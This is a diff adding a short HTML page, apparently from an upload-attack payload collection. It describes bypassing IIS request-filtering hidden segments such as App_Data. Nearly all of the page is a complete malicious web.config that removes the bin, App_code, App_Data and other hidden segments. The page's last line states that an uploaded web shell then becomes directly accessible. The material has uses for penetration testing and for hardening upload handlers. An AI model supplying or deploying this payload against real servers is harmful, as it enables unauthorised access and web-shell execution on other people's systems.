@@ -1,0 +1,31 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>web.config Removing Hidden Segment Protection</title>
+</head><body>Sometimes file uploaders rely on Hidden Segments of IIS Request Filtering such as APP_Data or App_GlobalResources directories to make the uploaded files inaccessible directly.<br/>
+<br/>
+However, this method can be bypassed by removing the hidden segments by using the following web.config file:<br/>
+<br/>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>
+&lt;configuration&gt;<br/>
+&nbsp; &nbsp; &lt;system.webServer&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &lt;security&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;requestFiltering&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;hiddenSegments&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;remove segment="bin" /&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;remove segment="App_code" /&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;remove segment="App_GlobalResources" /&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;remove segment="App_LocalResources" /&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;remove segment="App_Browsers" /&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;remove segment="App_WebReferences" /&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;remove segment="App_Data" /&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;!--Other IIS hidden segments can be listed here --&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;/hiddenSegments&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;/requestFiltering&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &lt;/security&gt;<br/>
+&nbsp; &nbsp; &lt;/system.webServer&gt;<br/>
+&lt;/configuration&gt;<br/>
+<br/>
+<br/>
+Now, an uploaded web shell file can be directly accessible.</body></html>
